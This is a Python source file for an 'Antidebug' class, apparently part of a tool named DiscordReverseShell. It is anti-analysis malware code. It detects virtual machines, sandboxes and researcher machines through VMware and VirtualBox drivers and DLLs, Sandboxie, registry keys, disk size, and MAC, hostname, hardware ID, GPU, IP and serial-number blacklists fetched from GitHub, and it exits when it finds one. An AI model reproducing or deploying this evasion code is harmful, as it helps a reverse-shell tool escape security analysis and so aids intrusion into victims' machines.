import re
import uuid
import wmi
import requests
import os
import ctypes
import sys
import subprocess
import socket
import psutil

    
class Antidebug:
    def __init__(self):
        self.disk_check()
        self.processes_check()
        self.reg_check()
        self.drivers_check()
        self.profiles()
        self.ip_check()
        self.hwid_check()
        self.gpu_check()
        self.pc_check()
        self.mac_check()
        
    
    def disk_check(self):
        disks = []
        for i in psutil.disk_partitions(all=False):
            if os.name == 'nt' and ('cdrom' in i.opts or i.fstype == ''):
                continue
            usage = psutil.disk_usage(i.mountpoint)
            disks.append((i.device, int(usage.total // (2**30))))

        for disk in disks:
            if disk[0] == "C:\\" and disk[1] <= 50:
                sys.exit(1)


    def drivers_check(self):
        if os.path.exists(r"C:\WINDOWS\system32\drivers\vmci.sys"):
            sys.exit(1)
            
        if os.path.exists(r"C:\WINDOWS\system32\drivers\vmhgfs.sys"):
            sys.exit(1)
            
        if os.path.exists(r"C:\WINDOWS\system32\drivers\vmmouse.sys"):
            sys.exit(1)
            
        if  os.path.exists(r"C:\WINDOWS\system32\drivers\vmsci.sys"):
            sys.exit(1)
            
        if os.path.exists(r"C:\WINDOWS\system32\drivers\vmusbmouse.sys"):
            sys.exit(1)
            
        if os.path.exists(r"C:\WINDOWS\system32\drivers\vmx_svga.sys"):
            sys.exit(1)
            
        if os.path.exists(r"C:\WINDOWS\system32\drivers\VBoxMouse.sys"):
            sys.exit(1)


    def reg_check(self):
        cmd = "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\"
        reg1 = subprocess.run(cmd + "DriverDesc", shell=True, stderr=subprocess.DEVNULL)
        reg2 = subprocess.run(cmd + "ProviderName", shell=True, stderr=subprocess.DEVNULL)
        if reg1.returncode == 0 and reg2.returncode == 0:
            sys.exit(1)


    def processes_check(self):
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    
    
        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            sys.exit(1)
                           
        if os.path.exists(vmware_dll): 
            sys.exit(1)
            
        if os.path.exists(virtualbox_dll):
            sys.exit(1)
        
        try:
            ctypes.cdll.LoadLibrary("SbieDll.dll")
            sys.exit(1)
        except:
            pass        
        
        processL = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/process.txt").text
        if processL in processList:
            sys.exit(1)
            
            
    def mac_check(self):
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        mac_list = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/mac.txt").text
        if mac_address[:8] in mac_list:
            sys.exit(1)
            
            
    def pc_check(self):
        vm_name = os.getlogin()
        _vm_name = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/pc_name.txt").text
        if vm_name in _vm_name:
            sys.exit(1)
        vm_username = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/pc_username.txt").text
        host_name = socket.gethostname()
        if host_name in vm_username:
            sys.exit(1)
            
            
    def hwid_check(self):
        current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
        hwid_vm = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/hwid.txt").text
        if current_machine_id in hwid_vm:
            sys.exit(1)
            
            
    def gpu_check(self):
        c = wmi.WMI()
        for gpu in c.Win32_DisplayConfiguration():
           GPUm = gpu.Description.strip()
        gpu_list = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/gpu.txt").text
        if GPUm in gpu_list:
            sys.exit(1)
         
            
    def ip_check(self):
        ip_list = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/ip.txt").text
        ip = requests.get("https://api.ipify.org").text
        if ip in ip_list:
            sys.exit(1)
           
            
    def profiles():
        guid_pc = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/guild.txt").text
        bios_guid = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/bios_serial.txt").text
        baseboard_guid = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/base_board_serial.txt").text
        serial_disk = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/disk_drive_serial.txt").text
        
        machine_guid = uuid.getnode()
        if machine_guid in guid_pc:
            sys.exit(1)
        w = wmi.WMI()
        
        for bios in w.Win32_BIOS():
            bios_check = bios.SerialNumber
            if bios_check in bios_guid:
                sys.exit(1) 
        
        for baseboard in w.Win32_BaseBoard():
            base_check = baseboard.SerialNumber
            if base_check in baseboard_guid:
                sys.exit(1)
                
        for disk in w.Win32_DiskDrive():
            disk_serial = disk.SerialNumber
            if disk_serial in serial_disk:
                sys.exit(1)
                
